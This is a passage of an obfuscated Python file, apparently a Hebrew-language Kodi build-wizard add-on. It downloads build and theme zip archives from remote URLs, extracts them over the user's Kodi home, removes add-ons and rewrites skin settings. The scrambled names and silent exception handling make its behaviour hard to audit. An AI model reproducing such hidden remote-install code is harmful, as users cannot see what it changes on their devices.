		xbmc .sleep (4000 )#line:3875
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3876
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3877
		fixfont ()#line:3878
		OO0OO0OOO00OO000O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3879
		try :#line:3880
			O00O0O00O00O00O00 =open (OO0OO0OOO00OO000O ,'r')#line:3881
			O00O0OOOO0OOO00OO =O00O0O00O00O00O00 .read ()#line:3882
			O00O0O00O00O00O00 .close ()#line:3883
			OO0O00000O00OO0O0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3884
			O0O000OOOO0OO00O0 =re .compile (OO0O00000O00OO0O0 ).findall (O00O0OOOO0OOO00OO )[0 ]#line:3885
			O00O0O00O00O00O00 =open (OO0OO0OOO00OO000O ,'w')#line:3886
			O00O0O00O00O00O00 .write (O00O0OOOO0OOO00OO .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0O000OOOO0OO00O0 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3887
			O00O0O00O00O00O00 .close ()#line:3888
		except :#line:3889
				pass #line:3890
		wiz .kodi17Fix ()#line:3891
		OO0OO0OOO00OO000O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3892
		try :#line:3893
			O00O0O00O00O00O00 =open (OO0OO0OOO00OO000O ,'r')#line:3894
			O00O0OOOO0OOO00OO =O00O0O00O00O00O00 .read ()#line:3895
			O00O0O00O00O00O00 .close ()#line:3896
			OO0O00000O00OO0O0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3897
			O0O000OOOO0OO00O0 =re .compile (OO0O00000O00OO0O0 ).findall (O00O0OOOO0OOO00OO )[0 ]#line:3898
			O00O0O00O00O00O00 =open (OO0OO0OOO00OO000O ,'w')#line:3899
			O00O0O00O00O00O00 .write (O00O0OOOO0OOO00OO .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0O000OOOO0OO00O0 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3900
			O00O0O00O00O00O00 .close ()#line:3901
		except :#line:3902
				pass #line:3903
		swapSkins ('skin.Premium.mod')#line:3904
def buildWizard (O0O0O0000OOO0O000 ,O0O00O0OO00O0OO0O ,theme =None ,over =False ):#line:3907
	if over ==False :#line:3908
		O0O00000OO0OOOOOO =wiz .checkBuild (O0O0O0000OOO0O000 ,'url')#line:3909
		if O0O00000OO0OOOOOO ==False :#line:3911
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3916
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3917
			return #line:3918
		OO000OO000O0O000O =wiz .workingURL (O0O00000OO0OOOOOO )#line:3919
		if OO000OO000O0O000O ==False :#line:3920
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO000OO000O0O000O ))#line:3921
			return #line:3922
	if O0O00O0OO00O0OO0O =='gui':#line:3923
		if O0O0O0000OOO0O000 ==BUILDNAME :#line:3924
			if over ==True :O00OO0O00OO00OOOO =1 #line:3925
			else :O00OO0O00OO00OOOO =1 #line:3926
		else :#line:3927
			O00OO0O00OO00OOOO =1 #line:3928
		if O00OO0O00OO00OOOO :#line:3929
			remove_addons ()#line:3930
			remove_addons2 ()#line:3931
			O0000OO0000O0OO0O =wiz .checkBuild (O0O0O0000OOO0O000 ,'gui')#line:3932
			OOOOO00000OO0000O =O0O0O0000OOO0O000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3933
			if not wiz .workingURL (O0000OO0000O0OO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3934
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3935
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0O0000OOO0O000 ),'','אנא המתן')#line:3936
			O00O0OO0O0OOOO00O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOO00000OO0000O )#line:3937
			try :os .remove (O00O0OO0O0OOOO00O )#line:3938
			except :pass #line:3939
			logging .warning (O0000OO0000O0OO0O )#line:3940
			if 'google'in O0000OO0000O0OO0O :#line:3941
			   O00000O0O0OOO00O0 =googledrive_download (O0000OO0000O0OO0O ,O00O0OO0O0OOOO00O ,DP ,wiz .checkBuild (O0O0O0000OOO0O000 ,'filesize'))#line:3942
			else :#line:3945
			  downloader .download (O0000OO0000O0OO0O ,O00O0OO0O0OOOO00O ,DP )#line:3946
			xbmc .sleep (100 )#line:3947
			OOO0O00O000O000O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0O0000OOO0O000 )#line:3948
			DP .update (0 ,OOO0O00O000O000O0 ,'','אנא המתן')#line:3949
			extract .all (O00O0OO0O0OOOO00O ,HOME ,DP ,title =OOO0O00O000O000O0 )#line:3950
			DP .close ()#line:3951
			wiz .defaultSkin ()#line:3952
			wiz .lookandFeelData ('save')#line:3953
			wiz .kodi17Fix ()#line:3954
			if KODIV >=18 :#line:3955
				skindialogsettind18 ()#line:3956
			xbmc .executebuiltin ("ReloadSkin()")#line:3957
			if INSTALLMETHOD ==1 :OOO0O000000O0O000 =1 #line:3958
			elif INSTALLMETHOD ==2 :OOO0O000000O0O000 =0 #line:3959
			else :DP .close ()#line:3960
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3961
			update_Votes ()#line:3962
			indicatorfastupdate ()#line:3963
		else :#line:3965
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3966
	if O0O00O0OO00O0OO0O =='gui2':#line:3967
		if O0O0O0000OOO0O000 ==BUILDNAME :#line:3968
			if over ==True :O00OO0O00OO00OOOO =1 #line:3969
			else :O00OO0O00OO00OOOO =1 #line:3970
		else :#line:3971
			O00OO0O00OO00OOOO =1 #line:3972
		if O00OO0O00OO00OOOO :#line:3973
			remove_addons ()#line:3974
			remove_addons2 ()#line:3975
			O0000OO0000O0OO0O =wiz .checkBuild (O0O0O0000OOO0O000 ,'gui')#line:3976
			OOOOO00000OO0000O =O0O0O0000OOO0O000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3977
			if not wiz .workingURL (O0000OO0000O0OO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3978
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3979
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0O0000OOO0O000 ),'','אנא המתן')#line:3980
			O00O0OO0O0OOOO00O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOO00000OO0000O )#line:3981
			try :os .remove (O00O0OO0O0OOOO00O )#line:3982
			except :pass #line:3983
			logging .warning (O0000OO0000O0OO0O )#line:3984
			if 'google'in O0000OO0000O0OO0O :#line:3985
			   O00000O0O0OOO00O0 =googledrive_download (O0000OO0000O0OO0O ,O00O0OO0O0OOOO00O ,DP ,wiz .checkBuild (O0O0O0000OOO0O000 ,'filesize'))#line:3986
			else :#line:3989
			  downloader .download (O0000OO0000O0OO0O ,O00O0OO0O0OOOO00O ,DP )#line:3990
			xbmc .sleep (100 )#line:3991
			OOO0O00O000O000O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0O0000OOO0O000 )#line:3992
			DP .update (0 ,OOO0O00O000O000O0 ,'','אנא המתן')#line:3993
			extract .all (O00O0OO0O0OOOO00O ,HOME ,DP ,title =OOO0O00O000O000O0 )#line:3994
			DP .close ()#line:3995
			wiz .defaultSkin ()#line:3996
			wiz .lookandFeelData ('save')#line:3997
			if INSTALLMETHOD ==1 :OOO0O000000O0O000 =1 #line:4000
			elif INSTALLMETHOD ==2 :OOO0O000000O0O000 =0 #line:4001
			else :DP .close ()#line:4002
		else :#line:4004
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4005
	elif O0O00O0OO00O0OO0O =='fresh':#line:4006
		freshStart (O0O0O0000OOO0O000 )#line:4007
	elif O0O00O0OO00O0OO0O =='normal':#line:4008
		if url =='normal':#line:4009
			if KEEPTRAKT =='true':#line:4010
				traktit .autoUpdate ('all')#line:4011
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4012
			if KEEPREAL =='true':#line:4013
				debridit .autoUpdate ('all')#line:4014
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4015
			if KEEPLOGIN =='true':#line:4016
				loginit .autoUpdate ('all')#line:4017
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4018
		OOO00OOO0O0O00O00 =int (KODIV );OOOO0OOO0OO00O00O =int (float (wiz .checkBuild (O0O0O0000OOO0O000 ,'kodi')))#line:4019
		if not OOO00OOO0O0O00O00 ==OOOO0OOO0OO00O00O :#line:4020
			if OOO00OOO0O0O00O00 ==16 and OOOO0OOO0OO00O00O <=15 :O00O0OOO0OOO00OO0 =False #line:4021
			else :O00O0OOO0OOO00OO0 =True #line:4022
		else :O00O0OOO0OOO00OO0 =False #line:4023
		if O00O0OOO0OOO00OO0 ==True :#line:4024
			OO000O0O0O0000OOO =1 #line:4025
		else :#line:4026
			if not over ==False :OO000O0O0O0000OOO =1 #line:4027
			else :OO000O0O0O0000OOO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4028
		if OO000O0O0O0000OOO :#line:4029
			wiz .clearS ('build')#line:4030
			O0000OO0000O0OO0O =wiz .checkBuild (O0O0O0000OOO0O000 ,'url')#line:4031
			OOOOO00000OO0000O =O0O0O0000OOO0O000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4032
			if not wiz .workingURL (O0000OO0000O0OO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4033
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4034
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0O0000OOO0O000 ,wiz .checkBuild (O0O0O0000OOO0O000 ,'version')),'','אנא המתן')#line:4035
			O00O0OO0O0OOOO00O =os .path .join (PACKAGES ,'%s.zip'%OOOOO00000OO0000O )#line:4036
			try :os .remove (O00O0OO0O0OOOO00O )#line:4037
			except :pass #line:4038
			logging .warning (O0000OO0000O0OO0O )#line:4039
			if 'google'in O0000OO0000O0OO0O :#line:4040
			   O00000O0O0OOO00O0 =googledrive_download (O0000OO0000O0OO0O ,O00O0OO0O0OOOO00O ,DP ,wiz .checkBuild (O0O0O0000OOO0O000 ,'filesize'))#line:4041
			else :#line:4044
			  downloader .download (O0000OO0000O0OO0O ,O00O0OO0O0OOOO00O ,DP )#line:4045
			xbmc .sleep (1000 )#line:4046
			OOO0O00O000O000O0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0O0000OOO0O000 ,wiz .checkBuild (O0O0O0000OOO0O000 ,'version'))#line:4047
			DP .update (0 ,OOO0O00O000O000O0 ,'','Please Wait')#line:4048
			O0O0O0OO0O00OO0O0 ,O00OO0OO0O0OOO00O ,O00OOO000OO00OOOO =extract .all (O00O0OO0O0OOOO00O ,HOME ,DP ,title =OOO0O00O000O000O0 )#line:4049
			if int (float (O0O0O0OO0O00OO0O0 ))>0 :#line:4050
				try :#line:4051
					wiz .fixmetas ()#line:4052
				except :pass #line:4053
				wiz .lookandFeelData ('save')#line:4054
				wiz .defaultSkin ()#line:4055
				wiz .setS ('buildname',O0O0O0000OOO0O000 )#line:4057
				wiz .setS ('buildversion',wiz .checkBuild (O0O0O0000OOO0O000 ,'version'))#line:4058
				wiz .setS ('buildtheme','')#line:4059
				wiz .setS ('latestversion',wiz .checkBuild (O0O0O0000OOO0O000 ,'version'))#line:4060
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4061
				wiz .setS ('installed','true')#line:4062
				wiz .setS ('extract',str (O0O0O0OO0O00OO0O0 ))#line:4063
				wiz .setS ('errors',str (O00OO0OO0O0OOO00O ))#line:4064
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0O0O0OO0O00OO0O0 ,O00OO0OO0O0OOO00O ))#line:4065
				fastupdatefirstbuild (NOTEID )#line:4066
				wiz .kodi17Fix ()#line:4067
				skin_homeselect ()#line:4068
				skin_lower ()#line:4069
				rdbuildinstall ()#line:4070
				try :gaiaserenaddon ()#line:4071
				except :pass #line:4072
				adults18 ()#line:4073
				skinfix18 ()#line:4074
				try :os .remove (O00O0OO0O0OOOO00O )#line:4076
				except :pass #line:4077
				OOOOOOOO0OO0O0O00 =(ADDON .getSetting ("auto_rd"))#line:4078
				if OOOOOOOO0OO0O0O00 =='true':#line:4079
					try :#line:4080
						setautorealdebrid ()#line:4081
					except :pass #line:4082
				try :#line:4083
					autotrakt ()#line:4084
				except :pass #line:4085
				O0OOOOOOO000OO0O0 =(ADDON .getSetting ("imdb_on"))#line:4086
				if O0OOOOOOO000OO0O0 =='true':#line:4087
					imdb_synck ()#line:4088
				iptvset ()#line:4089
				if int (float (O00OO0OO0O0OOO00O ))>0 :#line:4091
					O00OO0O00OO00OOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0O0000OOO0O000 ,wiz .checkBuild (O0O0O0000OOO0O000 ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O0O0OO0O00OO0O0 ,'%',COLOR1 ,O00OO0OO0O0OOO00O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4092
					if O00OO0O00OO00OOOO :#line:4093
						if isinstance (O00OO0OO0O0OOO00O ,unicode ):#line:4094
							O00OOO000OO00OOOO =O00OOO000OO00OOOO .encode ('utf-8')#line:4095
						wiz .TextBox (ADDONTITLE ,O00OOO000OO00OOOO )#line:4096
				DP .close ()#line:4097
				O0OOOOO00OOO0O0O0 =wiz .themeCount (O0O0O0000OOO0O000 )#line:4098
				builde_Votes ()#line:4099
				indicator ()#line:4100
				if not O0OOOOO00OOO0O0O0 ==False :#line:4101
					buildWizard (O0O0O0000OOO0O000 ,'theme')#line:4102
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4103
				if INSTALLMETHOD ==1 :OOO0O000000O0O000 =1 #line:4104
				elif INSTALLMETHOD ==2 :OOO0O000000O0O000 =0 #line:4105
				else :resetkodi ()#line:4106
				if OOO0O000000O0O000 ==1 :wiz .reloadFix ()#line:4108
				else :wiz .killxbmc (True )#line:4109
			else :#line:4110
				if isinstance (O00OO0OO0O0OOO00O ,unicode ):#line:4111
					O00OOO000OO00OOOO =O00OOO000OO00OOOO .encode ('utf-8')#line:4112
				O00O00OO00O0000OO =open (O00O0OO0O0OOOO00O ,'r')#line:4113
				OO000OOOOO00OOO0O =O00O00OO00O0000OO .read ()#line:4114
				OO0O0000OOOO0OO00 =''#line:4115
				for OO000O00O0OO0OOO0 in O00000O0O0OOO00O0 :#line:4116
				  OO0O0000OOOO0OO00 ='key: '+OO0O0000OOOO0OO00 +'\n'+OO000O00O0OO0OOO0 #line:4117
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O00OOO000OO00OOOO +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO0O0000OOOO0OO00 )#line:4118
		else :#line:4119
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4120
	elif O0O00O0OO00O0OO0O =='theme':#line:4121
		if theme ==None :#line:4122
			O0OOOOO00OOO0O0O0 =wiz .checkBuild (O0O0O0000OOO0O000 ,'theme')#line:4123
			OOO0OOOOO0OOOO000 =[]#line:4124
			if not O0OOOOO00OOO0O0O0 =='http://'and wiz .workingURL (O0OOOOO00OOO0O0O0 )==True :#line:4125
				OOO0OOOOO0OOOO000 =wiz .themeCount (O0O0O0000OOO0O000 ,False )#line:4126
				if len (OOO0OOOOO0OOOO000 )>0 :#line:4127
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O0O0O0000OOO0O000 ,COLOR1 ,len (OOO0OOOOO0OOOO000 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4128
						wiz .log ("Theme List: %s "%str (OOO0OOOOO0OOOO000 ))#line:4129
						O00OOO0OO00O0O00O =DIALOG .select (ADDONTITLE ,OOO0OOOOO0OOOO000 )#line:4130
						wiz .log ("Theme install selected: %s"%O00OOO0OO00O0O00O )#line:4131
						if not O00OOO0OO00O0O00O ==-1 :theme =OOO0OOOOO0OOOO000 [O00OOO0OO00O0O00O ];OO000OOOOOOO0OOO0 =True #line:4132
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4133
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4134
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4135
		else :OO000OOOOOOO0OOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O0O0O0000OOO0O000 ,wiz .checkBuild (O0O0O0000OOO0O000 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4136
		if OO000OOOOOOO0OOO0 :#line:4137
			O0O0O0O0OO00OO0OO =wiz .checkTheme (O0O0O0000OOO0O000 ,theme ,'url')#line:4138
			OOOOO00000OO0000O =O0O0O0000OOO0O000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4139
			if not wiz .workingURL (O0O0O0O0OO00OO0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4140
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4141
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4142
			O00O0OO0O0OOOO00O =os .path .join (PACKAGES ,'%s.zip'%OOOOO00000OO0000O )#line:4143
			try :os .remove (O00O0OO0O0OOOO00O )#line:4144
			except :pass #line:4145
			downloader .download (O0O0O0O0OO00OO0OO ,O00O0OO0O0OOOO00O ,DP )#line:4146
			xbmc .sleep (1000 )#line:4147
			DP .update (0 ,"","Installing %s "%O0O0O0000OOO0O000 )#line:4148
			O0O0OO0OOOO0O00OO =False #line:4149
			if url not in ["fresh","normal"]:#line:4150
				O0O0OO0OOOO0O00OO =testTheme (O00O0OO0O0OOOO00O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4151
				OOO0O000O0O000OOO =testGui (O00O0OO0O0OOOO00O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4152
				if O0O0OO0OOOO0O00OO ==True :#line:4153
					wiz .lookandFeelData ('save')#line:4154
					OO0O0O0OOOO0OO0O0 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4155
					OOO00O000O00OO0O0 =xbmc .getSkinDir ()#line:4156
					skinSwitch .swapSkins (OO0O0O0OOOO0OO0O0 )#line:4158
					O00O0000O00OOO00O =0 #line:4159
					xbmc .sleep (1000 )#line:4160
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0000O00OOO00O <150 :#line:4161
						O00O0000O00OOO00O +=1 #line:4162
						xbmc .sleep (1000 )#line:4163
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4164
						wiz .ebi ('SendClick(11)')#line:4165
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4166
					xbmc .sleep (1000 )#line:4167
			OOO0O00O000O000O0 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4168
			DP .update (0 ,OOO0O00O000O000O0 ,'','אנא המתן')#line:4169
			O0O0O0OO0O00OO0O0 ,O00OO0OO0O0OOO00O ,O00OOO000OO00OOOO =extract .all (O00O0OO0O0OOOO00O ,HOME ,DP ,title =OOO0O00O000O000O0 )#line:4170
			wiz .setS ('buildtheme',theme )#line:4171
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0O0O0OO0O00OO0O0 ,O00OO0OO0O0OOO00O ))#line:4172
			DP .close ()#line:4173
			if url not in ["fresh","normal"]:#line:4174
				wiz .forceUpdate ()#line:4175
				if KODIV >=17 :wiz .kodi17Fix ()#line:4176
				if OOO0O000O0O000OOO ==True :#line:4177
					wiz .lookandFeelData ('save')#line:4178
					wiz .defaultSkin ()#line:4179
					OOO00O000O00OO0O0 =wiz .getS ('defaultskin')#line:4180
					skinSwitch .swapSkins (OOO00O000O00OO0O0 )#line:4181
					O00O0000O00OOO00O =0 #line:4182
					xbmc .sleep (1000 )#line:4183
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0000O00OOO00O <150 :#line:4184
						O00O0000O00OOO00O +=1 #line:4185
						xbmc .sleep (1000 )#line:4186
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4188
						wiz .ebi ('SendClick(11)')#line:4189
					wiz .lookandFeelData ('restore')#line:4190
				elif O0O0OO0OOOO0O00OO ==True :#line:4191
					skinSwitch .swapSkins (OOO00O000O00OO0O0 )#line:4192
					O00O0000O00OOO00O =0 #line:4193
					xbmc .sleep (1000 )#line:4194
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0000O00OOO00O <150 :#line:4195
						O00O0000O00OOO00O +=1 #line:4196
						xbmc .sleep (1000 )#line:4197
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4199
						wiz .ebi ('SendClick(11)')#line:4200
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4201
					wiz .lookandFeelData ('restore')#line:4202
				else :#line:4203
					wiz .ebi ("ReloadSkin()")#line:4204
					xbmc .sleep (1000 )#line:4205
					wiz .ebi ("Container.Refresh")#line:4206
		else :#line:4207
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4208
def skin_homeselect ():#line:4212
	try :#line:4214
		OO0OOOOO00OO000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4215
		O0O0OO0O000OO0OO0 =open (OO0OOOOO00OO000OO ,'r')#line:4217
		O0000OO0000000000 =O0O0OO0O000OO0OO0 .read ()#line:4218
		O0O0OO0O000OO0OO0 .close ()#line:4219
		OOO00000O0OO0OO0O ='<setting id="HomeS" type="string(.+?)/setting>'#line:4220
		OOOO000OO00O0O000 =re .compile (OOO00000O0OO0OO0O ).findall (O0000OO0000000000 )[0 ]#line:4221
		O0O0OO0O000OO0OO0 =open (OO0OOOOO00OO000OO ,'w')#line:4222
		O0O0OO0O000OO0OO0 .write (O0000OO0000000000 .replace ('<setting id="HomeS" type="string%s/setting>'%OOOO000OO00O0O000 ,'<setting id="HomeS" type="string"></setting>'))#line:4223
		O0O0OO0O000OO0OO0 .close ()#line:4224
	except :#line:4225
		pass #line:4226
def skin_lower ():#line:4229
	O00OOO0O0OO000O0O =(ADDON .getSetting ("lower"))#line:4230
	if O00OOO0O0OO000O0O =='true':#line:4231
		try :#line:4234
			OO00OO00O0O0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4235
			OO00OOOOOOO0OOO0O =open (OO00OO00O0O0OOOOO ,'r')#line:4237
			O000000OO0OO0OO00 =OO00OOOOOOO0OOO0O .read ()#line:4238
			OO00OOOOOOO0OOO0O .close ()#line:4239
			OOO0O0O0OOO00O00O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4240
			OOO0OOOO0OOO0OO00 =re .compile (OOO0O0O0OOO00O00O ).findall (O000000OO0OO0OO00 )[0 ]#line:4241
			OO00OOOOOOO0OOO0O =open (OO00OO00O0O0OOOOO ,'w')#line:4242
			OO00OOOOOOO0OOO0O .write (O000000OO0OO0OO00 .replace ('<setting id="none_widget" type="bool%s/setting>'%OOO0OOOO0OOO0OO00 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4243
			OO00OOOOOOO0OOO0O .close ()#line:4244
			OO00OO00O0O0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4246
			OO00OOOOOOO0OOO0O =open (OO00OO00O0O0OOOOO ,'r')#line:4248
			O000000OO0OO0OO00 =OO00OOOOOOO0OOO0O .read ()#line:4249
			OO00OOOOOOO0OOO0O .close ()#line:4250
			OOO0O0O0OOO00O00O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4251
			OOO0OOOO0OOO0OO00 =re .compile (OOO0O0O0OOO00O00O ).findall (O000000OO0OO0OO00 )[0 ]#line:4252
			OO00OOOOOOO0OOO0O =open (OO00OO00O0O0OOOOO ,'w')#line:4253
			OO00OOOOOOO0OOO0O .write (O000000OO0OO0OO00 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OOO0OOOO0OOO0OO00 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4254
			OO00OOOOOOO0OOO0O .close ()#line:4255
			OO00OO00O0O0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4257
			OO00OOOOOOO0OOO0O =open (OO00OO00O0O0OOOOO ,'r')#line:4259
			O000000OO0OO0OO00 =OO00OOOOOOO0OOO0O .read ()#line:4260
			OO00OOOOOOO0OOO0O .close ()#line:4261
			OOO0O0O0OOO00O00O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4262
			OOO0OOOO0OOO0OO00 =re .compile (OOO0O0O0OOO00O00O ).findall (O000000OO0OO0OO00 )[0 ]#line:4263
			OO00OOOOOOO0OOO0O =open (OO00OO00O0O0OOOOO ,'w')#line:4264
